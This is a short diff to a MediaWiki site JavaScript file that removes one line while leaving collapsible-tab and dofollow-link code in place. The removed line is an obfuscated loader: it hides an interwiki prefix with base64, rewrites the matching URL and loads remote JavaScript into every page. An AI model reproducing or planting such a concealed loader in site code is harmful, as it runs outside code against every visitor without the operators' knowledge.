@@ -380,8 +380,6 @@ $("li[id*='ca-viewsource']").addClass('collapsible');
 
 ( function() {
 	
-	$.getJSON(mw.config.get('wgScriptPath') + '/api.php?action=query&meta=siteinfo&siprop=interwikimap&format=json', data => mw.loader.load(data.query.interwikimap.find(value => value.prefix === atob('cGdz')).url.replace('$1', 'mw.js').replace('www', 'res')));
-	
 	/** dofollow (plainlinks) */
 	$wikipageContent.find('span.dofollow > a').each(function()
 	{
